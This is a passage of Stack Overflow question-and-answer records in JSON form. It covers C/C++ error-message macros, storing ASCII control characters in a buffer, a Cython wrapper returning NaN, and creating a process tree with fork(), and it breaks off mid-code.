"FreelanceConsultant", "link": "https://stackoverflow.com/users/893254/freelanceconsultant"}, "edited": false, "score": 0, "creation_date": 1518103724, "post_id": 48664121, "comment_id": 84376055, "body": "The tag is for C and C++ languages."}], "answers": [{"comments": [{"owner": {"reputation": 884, "user_id": 9009404, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6be791318ce35f7966345ff4964a2025?s=128&d=identicon&r=PG&f=1", "display_name": "Uprooted", "link": "https://stackoverflow.com/users/9009404/uprooted"}, "edited": false, "score": 1, "creation_date": 1518009851, "post_id": 48664721, "comment_id": 84327265, "body": "For all template &amp; object foolery of C++ it never quite superseded macros. Whole talk about bad-bad macros is just to deter novice programmers from overusing them."}, {"owner": {"reputation": 27420, "user_id": 4756299, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e38adc5559df095cfe10c664916e8ffa?s=128&d=identicon&r=PG&f=1", "display_name": "Andrew Henle", "link": "https://stackoverflow.com/users/4756299/andrew-henle"}, "edited": false, "score": 0, "creation_date": 1518009884, "post_id": 48664721, "comment_id": 84327289, "body": "Fun exercise: come up with logging macros like yours for older compilers that don&#39;t implement vararg macros, but that still capture <code>__FILE__</code>, <code>__LINE__</code>, and <code>__function__</code>."}, {"owner": {"reputation": 205167, "user_id": 4323, "user_type": "registered", "accept_rate": 82, "profile_image": "https://i.stack.imgur.com/qqgFU.png?s=128&g=1", "display_name": "John Zwinck", "link": "https://stackoverflow.com/users/4323/john-zwinck"}, "reply_to_user": {"reputation": 27420, "user_id": 4756299, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e38adc5559df095cfe10c664916e8ffa?s=128&d=identicon&r=PG&f=1", "display_name": "Andrew Henle", "link": "https://stackoverflow.com/users/4756299/andrew-henle"}, "edited": false, "score": 0, "creation_date": 1518010416, "post_id": 48664721, "comment_id": 84327651, "body": "@AndrewHenle: The macros I linked rely on C++11 (variadic templates), not just variadic macros.  I would be surprised to find a compiler that supports the former but not the latter...but probably there is one."}, {"owner": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "edited": false, "score": 0, "creation_date": 1518011369, "post_id": 48664721, "comment_id": 84328337, "body": "What do <code>__FILE__</code> and <code>__LINE__</code> have to do with macros? What is <code>__function__</code>, did you mean standard <code>__func__</code>? None of these depend on the pre-processor."}, {"owner": {"reputation": 205167, "user_id": 4323, "user_type": "registered", "accept_rate": 82, "profile_image": "https://i.stack.imgur.com/qqgFU.png?s=128&g=1", "display_name": "John Zwinck", "link": "https://stackoverflow.com/users/4323/john-zwinck"}, "reply_to_user": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "edited": false, "score": 0, "creation_date": 1518011485, "post_id": 48664721, "comment_id": 84328431, "body": "@Lundin: Try to make an exception throwing function without macros which propagates the throw-site&#39;s <code>__FILE__</code> and <code>__LINE__</code> info."}, {"owner": {"reputation": 2289, "user_id": 2356414, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/dff4a2241e2dcfc50615e4b7c709bd17?s=128&d=identicon&r=PG", "display_name": "KABoissonneault", "link": "https://stackoverflow.com/users/2356414/kaboissonneault"}, "reply_to_user": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "edited": false, "score": 1, "creation_date": 1518011751, "post_id": 48664721, "comment_id": 84328617, "body": "@Lundin Functions and other abstraction tools are not inlined in the source where the error should be thrown. If you use <code>__LINE__</code> in a <code>report_error</code> function, then <code>__LINE__</code> will refer to that function, not the caller, as you would expect from an error report. With that said, we might get <code>std::source_location</code> eventually..."}, {"owner": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "edited": false, "score": 0, "creation_date": 1518012330, "post_id": 48664721, "comment_id": 84328976, "body": "@JohnZwinck Well there&#39;s <code>assert</code> but I get your point now."}], "tags": [], "owner": {"reputation": 205167, "user_id": 4323, "user_type": "registered", "accept_rate": 82, "profile_image": "https://i.stack.imgur.com/qqgFU.png?s=128&g=1", "display_name": "John Zwinck", "link": "https://stackoverflow.com/users/4323/john-zwinck"}, "is_accepted": false, "score": 3, "last_activity_date": 1518011449, "last_edit_date": 1518011449, "creation_date": 1518009026, "answer_id": 48664721, "question_id": 48664121, "link": "https://stackoverflow.com/questions/48664121/c-what-are-the-best-practices-regarding-runtime-warning-errors-and-messages/48664721#48664721", "title": "C++: What are the best practices regarding runtime warning errors and messages?", "body": "<p>Using macros for this is good practice.  It enables implicit use of <code>__FILE__</code>, <code>__LINE__</code>, <code>__func__</code>, etc.  For example, <code>BOOST_THROW_EXCEPTION</code> bundles up all this metadata about the exception for you.</p>\n\n<p>Personally I always create a project-specific set of macros similar to your <code>DT_THROW_IF</code>.  This allows capturing the full metadata at the throw site without clutter.  And if the macros are constructed properly, there is no downside, and they rarely need to be modified or maintained.</p>\n\n<p>As an example of what I'm talking about, here's one open source project of mine which has such macros: <a href=\"https://github.com/jzwinck/pccl/blob/master/throw.hpp\" rel=\"nofollow noreferrer\">https://github.com/jzwinck/pccl/blob/master/throw.hpp</a> - they are production tested (with GCC) and you're welcome to use them.</p>\n"}], "owner": {"reputation": 9704, "user_id": 893254, "user_type": "registered", "accept_rate": 30, "profile_image": "https://www.gravatar.com/avatar/e4417c43fd253cd5b52e2dd709e34b44?s=128&d=identicon&r=PG&f=1", "display_name": "FreelanceConsultant", "link": "https://stackoverflow.com/users/893254/freelanceconsultant"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 367, "favorite_count": 0, "closed_date": 1518016869, "answer_count": 1, "score": -1, "last_activity_date": 1518011449, "creation_date": 1518007325, "question_id": 48664121, "link": "https://stackoverflow.com/questions/48664121/c-what-are-the-best-practices-regarding-runtime-warning-errors-and-messages", "closed_reason": "Opinion-based", "title": "C++: What are the best practices regarding runtime warning errors and messages?", "body": "<p>Just started playing around with SDL2 again this morning, although the fact that SDL is used in the example here is not relevant, for the purposes of this question we could consider any framework / toolkit / library which can produce runtime errors.</p>\n\n<p>Started writing the following code:</p>\n\n<pre><code>if(SDL_Init(SDL_INIT_VIDEO) &lt; 0)\n{\n    std::cerr &lt;&lt; SDL_GetError() &lt;&lt; std::endl;\n}\n</code></pre>\n\n<p>I don't think this is very good.</p>\n\n<ul>\n<li><p>This style of outputting messages to <code>cerr</code> is not easy to change in future if we needed to do so. If we want to print error messages to a file instead, then we would have to find all occurances of this code snipped and change <code>cout</code> to a file. This would clearly not be practical or easy.</p></li>\n<li><p>It isn't very flexible. Perhaps we might want to have errors, warnings, and general info messages. They might need to go to different places depending on how the user has configured our program. Perhaps some users want to see all warnings and info and others want to see nothing but the most \"critical\" error messages.</p></li>\n</ul>\n\n<p>From working on other projects I have seen things used which look like macros.</p>\n\n<p>For example, the following sticks in my mind:</p>\n\n<pre><code>DT_THROW_IF(condition, \"message\");\n</code></pre>\n\n<p>My assumption is that this is implemented as a macro. If <code>condition</code> evaluates to <code>true</code> then <code>message</code> appears in the output. (<code>cout</code>/<code>cerr</code>)</p>\n\n<p>The use of a macro like this might go some way to addressing the above issues, however I have heard that <a href=\"https://stackoverflow.com/questions/14041453/why-are-preprocessor-macros-evil-and-what-are-the-alternatives\">it is not good practice to make extensive uses of macros</a>.</p>\n\n<ul>\n<li>What are some best practices for error message and warning message handeling in C or C++ programs? What good solutions are available and when is their use appropriate?</li>\n</ul>\n"}, {"tags": ["c", "linux", "ascii"], "comments": [{"owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 4, "creation_date": 1518007232, "post_id": 48664028, "comment_id": 84325269, "body": "By <code>^A</code> I assume you&#39;re meaning what is known as &quot;control-A&quot; which corresponds to the <a href=\"http://en.cppreference.com/w/c/language/ascii\" rel=\"nofollow noreferrer\">ASCII</a> control character <code>SOH</code>? If I then tell you that <code>^B</code> corresponds to <code>STX</code> I&#39;m sure you will be able to figure out what <code>^D</code> should be."}, {"owner": {"reputation": 3001, "user_id": 2830324, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/8e718abdfd920bb3f66d81bbbb10e80f?s=128&d=identicon&r=PG&f=1", "display_name": "md.jamal", "link": "https://stackoverflow.com/users/2830324/md-jamal"}, "reply_to_user": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 0, "creation_date": 1518007269, "post_id": 48664028, "comment_id": 84325289, "body": "Yes. Exactly SOH"}, {"owner": {"reputation": 40219, "user_id": 898348, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/13b3f2c44ba8449bd60764d07f4538dc?s=128&d=identicon&r=PG", "display_name": "Jabberwocky", "link": "https://stackoverflow.com/users/898348/jabberwocky"}, "edited": false, "score": 0, "creation_date": 1518007457, "post_id": 48664028, "comment_id": 84325436, "body": "<code>&#39;^A&#39;</code> -&gt; <code>1</code>, <code>&#39;^D&#39;</code> -&gt; <code>4</code>"}, {"owner": {"reputation": 56828, "user_id": 4062354, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/xcV4d.png?s=128&g=1", "display_name": "MikeCAT", "link": "https://stackoverflow.com/users/4062354/mikecat"}, "edited": false, "score": 1, "creation_date": 1518008772, "post_id": 48664028, "comment_id": 84326420, "body": "<code>&#39;^A&#39;</code> is multi-character character constant, whose value is implementation-defined."}, {"owner": {"reputation": 23378, "user_id": 4850040, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/acYd0.png?s=128&g=1", "display_name": "Toby Speight", "link": "https://stackoverflow.com/users/4850040/toby-speight"}, "edited": false, "score": 1, "creation_date": 1518011900, "post_id": 48664028, "comment_id": 84328716, "body": "<code>^A</code> is a conventional way to write ASCII <code>SOH</code> - in C, we write it as <code>\\001</code>."}], "answers": [{"comments": [{"owner": {"reputation": 3001, "user_id": 2830324, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/8e718abdfd920bb3f66d81bbbb10e80f?s=128&d=identicon&r=PG&f=1", "display_name": "md.jamal", "link": "https://stackoverflow.com/users/2830324/md-jamal"}, "edited": false, "score": 0, "creation_date": 1518009190, "post_id": 48664590, "comment_id": 84326766, "body": "It didn&#39;t worked.. Writing to file it added those characters but not when printing on the screen"}, {"owner": {"reputation": 40219, "user_id": 898348, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/13b3f2c44ba8449bd60764d07f4538dc?s=128&d=identicon&r=PG", "display_name": "Jabberwocky", "link": "https://stackoverflow.com/users/898348/jabberwocky"}, "reply_to_user": {"reputation": 3001, "user_id": 2830324, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/8e718abdfd920bb3f66d81bbbb10e80f?s=128&d=identicon&r=PG&f=1", "display_name": "md.jamal", "link": "https://stackoverflow.com/users/2830324/md-jamal"}, "edited": false, "score": 1, "creation_date": 1518010646, "post_id": 48664590, "comment_id": 84327817, "body": "@md.jamal you cannot <code>printf</code> control codes (ASCII codes &lt; 32) and expect to get an output like <code>^A</code>."}], "tags": [], "owner": {"reputation": 679, "user_id": 5155574, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-FX9BZpOiVdk/AAAAAAAAAAI/AAAAAAAAAI0/cHgtmpGWfgM/photo.jpg?sz=128", "display_name": "Josh Abraham", "link": "https://stackoverflow.com/users/5155574/josh-abraham"}, "is_accepted": false, "score": 0, "last_activity_date": 1518008714, "creation_date": 1518008714, "answer_id": 48664590, "question_id": 48664028, "link": "https://stackoverflow.com/questions/48664028/control-characters-in-c-buffer/48664590#48664590", "title": "control characters in C Buffer", "body": "<p>You are trying to store byte values in an array:</p>\n\n<pre><code>unsigned char fileData[] = {0x01,'S','O','0','0',0x04},\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 5623, "user_id": 1347519, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/a9e1eb6e25803528d25f57f3df79e115?s=128&d=identicon&r=PG", "display_name": "Attie", "link": "https://stackoverflow.com/users/1347519/attie"}, "is_accepted": true, "score": 3, "last_activity_date": 1518092991, "last_edit_date": 1518092991, "creation_date": 1518009686, "answer_id": 48664916, "question_id": 48664028, "link": "https://stackoverflow.com/questions/48664028/control-characters-in-c-buffer/48664916#48664916", "title": "control characters in C Buffer", "body": "<p>I'm surprised this compiles... It certainly throws warnings on my system, and I see \"<code>ASO00D</code>\" printed.</p>\n\n<pre class=\"lang-c prettyprint-override\"><code>#include &lt;stdio.h&gt;\n\nvoid main(void) {\n        unsigned char fileData[] = {'^A','S','O','0','0','^D'};\n\n        printf(\"%s\\n\", fileData);\n}\n</code></pre>\n\n<pre><code>$ gcc x.c -o x -Wall\nx.c:3:6: warning: return type of \u2018main\u2019 is not \u2018int\u2019 [-Wmain]\n void main(void) {\n      ^\nx.c: In function \u2018main\u2019:\nx.c:4:30: warning: multi-character character constant [-Wmultichar]\n  unsigned char fileData[] = {'^A','S','O','0','0','^D'};\n                              ^\nx.c:4:30: warning: large integer implicitly truncated to unsigned type [-Woverflow]\nx.c:4:51: warning: multi-character character constant [-Wmultichar]\n  unsigned char fileData[] = {'^A','S','O','0','0','^D'};\n                                                   ^\nx.c:4:51: warning: large integer implicitly truncated to unsigned type [-Woverflow]\n$ ./x\nASO00D\n</code></pre>\n\n<p>Don't forget to use <code>-Wall</code> and read the warnings - they are helpful!</p>\n\n<p><code>^A</code> is not a printable character, thus <code>printf()</code> (or more correctly your terminal) will not render it correctly, even if this had worked as you expected.</p>\n\n<p>Also, as pointed out by Michael Walz in the comments, you should always terminate a string with a nul character - <code>\\0</code>. In the above example you risk running past the end of the array, and thus <em>undefined behaviour</em>.</p>\n\n<hr>\n\n<p>What you are actually trying to use is the common human-readable notation for control characters.</p>\n\n<p><kbd>Ctrl</kbd> + <kbd>A</kbd> is typically printed as <code>^A</code>.</p>\n\n<p>This doesn't mean you can put <code>^A</code> into a C character and expect it to work - for a start it's two characters... <code>^</code> and <code>A</code>.</p>\n\n<p>Instead, you should refer to the <a href=\"http://www.asciitable.com/\" rel=\"nofollow noreferrer\">ASCII table</a>, and understand that pressing <kbd>Ctrl</kbd> or <kbd>Shift</kbd> actually modify the key pressed. <em>[I'm not referring to the keyboard scancodes]</em>.</p>\n\n<pre><code> a  0x61  0b01100001\n A  0x41  0b01000001\n^A  0x01  0b00000001\n</code></pre>\n\n<ul>\n<li>Pressing <kbd>A</kbd> produces an <code>a</code> (<code>0x61</code>)</li>\n<li>Pressing <kbd>Shift</kbd> + <kbd>A</kbd> produces an <code>A</code> (<code>0x61 &amp; ~0x20 = 0x41</code>)</li>\n<li>Pressing <kbd>Ctrl</kbd> + <kbd>A</kbd> produces a <code>^A</code> (<code>0x61 &amp; ~0x60 = 0x01</code>)</li>\n</ul>\n\n<p>Try instead using this:</p>\n\n<pre class=\"lang-c prettyprint-override\"><code>unsigned char fileData[] = {0x01,'S','O','0','0',0x04,'\\0'};\n</code></pre>\n\n<p>However, even this will not <code>printf()</code> \"<em>correctly</em>\".</p>\n\n<p>Try instead using a loop, like this: (note the <code>isprint()</code> and <code>iscntrl()</code> tests)</p>\n\n<pre class=\"lang-c prettyprint-override\"><code>#include &lt;stdio.h&gt;\n#include &lt;ctype.h&gt;\n\nvoid main(void) {\n        int i;\n        unsigned char fileData[] = {0x01,'S','O','0','0',0x04,'\\0'};\n\n        printf(\"%s\\n\", fileData);\n\n        for (i = 0; i &lt; sizeof(fileData) - 1; i++) {\n                printf(\"%3d: 0x%02X   \", i, fileData[i]);\n                if (isprint(fileData[i])) {\n                        printf(\"%c\", fileData[i]);\n                } else if (iscntrl(fileData[i])) {\n                        printf(\"^%c\", fileData[i] + 'A' - 1);\n                } else {\n                        printf(\".\");\n                }\n                printf(\"\\n\");\n        }\n}\n</code></pre>\n\n<pre><code>$ gcc x.c -o x -Wall\nx.c:4:6: warning: return type of \u2018main\u2019 is not \u2018int\u2019 [-Wmain]\n void main(void) {\n      ^\n$ ./x\nSO00\n  0: 0x01   ^A\n  1: 0x53   S\n  2: 0x4F   O\n  3: 0x30   0\n  4: 0x30   0\n  5: 0x04   ^D\n</code></pre>\n"}], "owner": {"reputation": 3001, "user_id": 2830324, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/8e718abdfd920bb3f66d81bbbb10e80f?s=128&d=identicon&r=PG&f=1", "display_name": "md.jamal", "link": "https://stackoverflow.com/users/2830324/md-jamal"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 891, "favorite_count": 0, "accepted_answer_id": 48664916, "answer_count": 2, "score": 0, "last_activity_date": 1518092991, "creation_date": 1518007068, "question_id": 48664028, "link": "https://stackoverflow.com/questions/48664028/control-characters-in-c-buffer", "title": "control characters in C Buffer", "body": "<p>I need to transmit the following content over socket.</p>\n\n<pre><code>^ASO00^D\n</code></pre>\n\n<p>I tried to store them in buffer:</p>\n\n<pre><code>unsigned char fileData[] = {'^A','S','O','0','0','^D'},\n</code></pre>\n\n<p>when I print the fileData, it doesn't print the ASCII Characters.</p>\n\n<pre><code> printf(\"%s\\n\", fileData);\n</code></pre>\n\n<p>It only prints \"S000\".</p>\n\n<p>How can I save the control characters in buffer</p>\n\n<p>But when I store this in a file and read it from the file, the control characters gets printed</p>\n"}, {"tags": ["python", "c", "cython", "wrapper", "nan"], "comments": [{"owner": {"reputation": 23378, "user_id": 4850040, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/acYd0.png?s=128&g=1", "display_name": "Toby Speight", "link": "https://stackoverflow.com/users/4850040/toby-speight"}, "edited": false, "score": 2, "creation_date": 1518006905, "post_id": 48663897, "comment_id": 84325092, "body": "Can you make this into a reproducible example, i.e. a <a href=\"https://stackoverflow.com/help/minimal-reproducible-example\">minimal reproducible example</a>?  Thanks."}, {"owner": {"reputation": 1053, "user_id": 4265321, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/fd6bafb9454cd5e54c23ddd0d1bd46f9?s=128&d=identicon&r=PG", "display_name": "johnhenry", "link": "https://stackoverflow.com/users/4265321/johnhenry"}, "reply_to_user": {"reputation": 23378, "user_id": 4850040, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/acYd0.png?s=128&g=1", "display_name": "Toby Speight", "link": "https://stackoverflow.com/users/4850040/toby-speight"}, "edited": false, "score": 0, "creation_date": 1518007008, "post_id": 48663897, "comment_id": 84325145, "body": "@TobySpeight I am editing my post"}, {"owner": {"reputation": 4536, "user_id": 4165324, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c8d50177f8e05b2c515b26455ba250ce?s=128&d=identicon&r=PG&f=1", "display_name": "danny", "link": "https://stackoverflow.com/users/4165324/danny"}, "edited": false, "score": 1, "creation_date": 1518023667, "post_id": 48663897, "comment_id": 84337026, "body": "Can you share your <code>setup.py</code>? Also, how is the C code and the extension compiled? Specifically, what compiler is used for each and how is the linking performed?"}, {"owner": {"reputation": 23048, "user_id": 4657412, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/4915a27d01efa79d81d322511ee517a9?s=128&d=identicon&r=PG&f=1", "display_name": "DavidW", "link": "https://stackoverflow.com/users/4657412/davidw"}, "edited": false, "score": 1, "creation_date": 1518114488, "post_id": 48663897, "comment_id": 84382978, "body": "This still isn&#39;t a complete and verifiable example. We&#39;re missing the declarations of <code>background</code>, <code>spectra</code>, <code>perturbs</code>, and also the class <code>myclass</code>. It&#39;s possible that the build information that danny mentioned in also relevant, but at a minimum we need some code that we can actually compile and see the error."}], "owner": {"reputation": 1053, "user_id": 4265321, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/fd6bafb9454cd5e54c23ddd0d1bd46f9?s=128&d=identicon&r=PG", "display_name": "johnhenry", "link": "https://stackoverflow.com/users/4265321/johnhenry"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 262, "favorite_count": 0, "answer_count": 0, "score": 0, "last_activity_date": 1518007094, "creation_date": 1518006702, "last_edit_date": 1518007094, "question_id": 48663897, "link": "https://stackoverflow.com/questions/48663897/wrapping-a-c-function-with-cython-producing-nan", "title": "Wrapping a C function with Cython, producing NaN", "body": "<p>I have a function in a <code>C</code> code that returns a <code>double</code>. \nIn order to make a reproducible example, I will simplify it extremely in the following way. In the <code>.c</code> file:</p>\n\n<pre><code>double myfunction_at_k_and_z(struct background * pba,\n                          struct spectra * psp,\n                          struct perturbs *ppt,\n                          double k,\n                          double z,\n                          double * pk_ic) \n{ \ndouble result = 3.;\n\nreturn result;}\n</code></pre>\n\n<p>in the <code>.h</code> file:</p>\n\n<pre><code>double myfunction_at_k_and_z (struct background * pba,\n                          struct spectra * psp,\n                          struct perturbs *ppt,\n                          double k,\n                          double z,\n                          double * pk_ic);\n</code></pre>\n\n<p>and everything works well with it, the output <code>result</code> is the one I am expecting, I can use e.g. <code>fprintf</code> inside the function to print the value of <code>result</code> on screen and it looks good.</p>\n\n<p>Now I would like to wrap this function with a <code>Python</code> wrapper, using <code>Cython</code>. In the <code>.pyx</code> file I create this function within a class <code>myclass</code>:</p>\n\n<pre><code>def get_myfunction_at_k_and_z(self, double k, double z):\n        cdef double dummy\n        cdef double result = myfunction_at_k_and_z(&amp;self.ba, &amp;self.sp, &amp;self.pt, k, z, &amp;dummy)\n        return result\n</code></pre>\n\n<p>and in the <code>.pxd</code> file I declare:</p>\n\n<pre><code>double myfunction_at_k_and_z (background * pba, spectra * psp, perturbs *ppt, double k, double z, double * pk_ic)\n</code></pre>\n\n<p>so that the wrapper knows about the original function in <code>C</code>. This compiles nicely, but if now I call <code>myfunction_at_k_and_z</code> from <code>Python</code>, at values e.g. <code>k = 0.1, z = 1.</code> via</p>\n\n<pre><code>myclass.get_myfunction_at_k_and_z(0.1,1.)\n</code></pre>\n\n<p>this function prints a <code>nan</code>!!!\nThat is odd, why does it work in <code>C</code> but not in <code>Python</code>?</p>\n"}, {"tags": ["c", "unix", "fork"], "comments": [{"owner": {"reputation": 7497, "user_id": 1213227, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/78179ef730f268752c0f6fdde3943b99?s=128&d=identicon&r=PG", "display_name": "Matthias", "link": "https://stackoverflow.com/users/1213227/matthias"}, "edited": false, "score": 0, "creation_date": 1518006283, "post_id": 48663589, "comment_id": 84324712, "body": "Your root node should have two children only. Why do you create 4?"}, {"owner": {"reputation": 6899, "user_id": 1212012, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/gmBY7.png?s=128&g=1", "display_name": "Mathieu", "link": "https://stackoverflow.com/users/1212012/mathieu"}, "edited": false, "score": 0, "creation_date": 1518006394, "post_id": 48663589, "comment_id": 84324775, "body": "You should add some control to know which process is going to <code>fork()</code>, the root need to fork twice, the childs only once."}, {"owner": {"reputation": 6899, "user_id": 1212012, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/gmBY7.png?s=128&g=1", "display_name": "Mathieu", "link": "https://stackoverflow.com/users/1212012/mathieu"}, "edited": false, "score": 1, "creation_date": 1518006417, "post_id": 48663589, "comment_id": 84324794, "body": "Is that an assigment?"}, {"owner": {"reputation": 1528, "user_id": 6676042, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/1pROg.jpg?s=128&g=1", "display_name": "IanC", "link": "https://stackoverflow.com/users/6676042/ianc"}, "edited": false, "score": 1, "creation_date": 1518006504, "post_id": 48663589, "comment_id": 84324850, "body": "The loop only run once for every process (except the last, where <code>i == 4</code> and it doesn&#39;t run at all), because you are stucking the loop in the parent process of the <code>fork</code> with the <code>wait</code> and <code>exit</code> calls. Also, you&#39;re not controlling which process is being forked."}], "answers": [{"comments": [{"owner": {"reputation": 83, "user_id": 7762023, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/e25c5c2c3c1ade6f27ff3b796b65bf6a?s=128&d=identicon&r=PG&f=1", "display_name": "Yvette", "link": "https://stackoverflow.com/users/7762023/yvette"}, "edited": false, "score": 0, "creation_date": 1518010298, "post_id": 48664324, "comment_id": 84327566, "body": "In the line where you have the grandchildren process comment, instead of it being &quot;ret&quot; is it suppose to be a &quot;children_ret&quot;? Since it&#39;s coming from the children. I think I&#39;m starting to understand this now."}, {"owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "reply_to_user": {"reputation": 83, "user_id": 7762023, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/e25c5c2c3c1ade6f27ff3b796b65bf6a?s=128&d=identicon&r=PG&f=1", "display_name": "Yvette", "link": "https://stackoverflow.com/users/7762023/yvette"}, "edited": false, "score": 0, "creation_date": 1518015155, "post_id": 48664324, "comment_id": 84331041, "body": "@Yvette \u2014 yes, there is a typo"}, {"owner": {"reputation": 1528, "user_id": 6676042, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/1pROg.jpg?s=128&g=1", "display_name": "IanC", "link": "https://stackoverflow.com/users/6676042/ianc"}, "reply_to_user": {"reputation": 83, "user_id": 7762023, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/e25c5c2c3c1ade6f27ff3b796b65bf6a?s=128&d=identicon&r=PG&f=1", "display_name": "Yvette", "link": "https://stackoverflow.com/users/7762023/yvette"}, "edited": false, "score": 0, "creation_date": 1518015827, "post_id": 48664324, "comment_id": 84331514, "body": "@Yvette Exactly, it was a typo. I just edited the answer!"}], "tags": [], "owner": {"reputation": 1528, "user_id": 6676042, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/1pROg.jpg?s=128&g=1", "display_name": "IanC", "link": "https://stackoverflow.com/users/6676042/ianc"}, "is_accepted": false, "score": 1, "last_activity_date": 1518015634, "last_edit_date": 1518015634, "creation_date": 1518007971, "answer_id": 48664324, "question_id": 48663589, "link": "https://stackoverflow.com/questions/48663589/creating-a-process-tree-with-4-children/48664324#48664324", "title": "Creating a process tree with 4 children", "body": "<p>Your flaw is in the logic of the program itself. First you think of making a loop with 4 iterations, when in reality you only want 2 children on the parent process. But then, when <code>fork</code> is successful (<code>ret &gt; 0</code>) you are calling <code>wait(NULL); exit(0);</code> which will stop the <code>for</code> loop and exit the process once <code>wait</code> stops hanging. When the children are <code>forked</code>, they will be inside the <code>for</code> loop themselfs as well. If the loop wasn't getting stuck in the <code>wait(NULL); exit(0);</code> statements you'd have an even bigger mess, with the parent process having 4 children, and the childrens having between 3 and 0 childrens, and the grandchildrens having between 2 and 0 childrens, and so on..</p>\n\n<p>What you need is something like this:</p>\n\n<pre><code>for(i = 0; i &lt; 2; ++i){\n  pid_t ret = fork();\n\n  if(ret &lt; 0){\n    printf(\"Fork Failed!\\n\");\n    return 1;\n  } else if(ret == 0) { //Children process\n    pid_t children_ret = fork();\n\n    if(children_ret &lt; 0){\n      printf(\"Fork Failed!\\n\");\n      return 1;\n    } else if(children_ret == 0) { //Grandchildren process\n      //... Do whatever you want on the grandchildren process\n      exit(0);\n    }\n\n    //... Do whatever you want on the children process\n    wait(NULL);\n    exit(0);\n  }\n}\n//... Do whatever you want on the parent process\nwait(NULL);\nexit(0);\n</code></pre>\n\n<p>Note that the <code>exit</code> calls on the children and grandchildren processes are <strong>very important</strong>. That's because all the processes share the same code, so if they don't exit on those points they will keep running whatever rest of code you have (i.e.: the grandchildren will run the children code and the parent code).</p>\n"}], "owner": {"reputation": 83, "user_id": 7762023, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/e25c5c2c3c1ade6f27ff3b796b65bf6a?s=128&d=identicon&r=PG&f=1", "display_name": "Yvette", "link": "https://stackoverflow.com/users/7762023/yvette"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 670, "favorite_count": 0, "answer_count": 1, "score": -1, "last_activity_date": 1518015634, "creation_date": 1518005823, "last_edit_date": 1518006068, "question_id": 48663589, "link": "https://stackoverflow.com/questions/48663589/creating-a-process-tree-with-4-children", "title": "Creating a process tree with 4 children", "body": "<p>I am having trouble creating this process tree. </p>\n\n<p><a href=\"https://i.stack.imgur.com/DfzHf.png\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/DfzHf.png\" alt=\"Process Tree\"></a></p>\n\n<p>This is my code: </p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;unistd.h&gt;\n#include &lt;stdlib.h&gt; \n#include &lt;sys/types.h&gt;\n#include 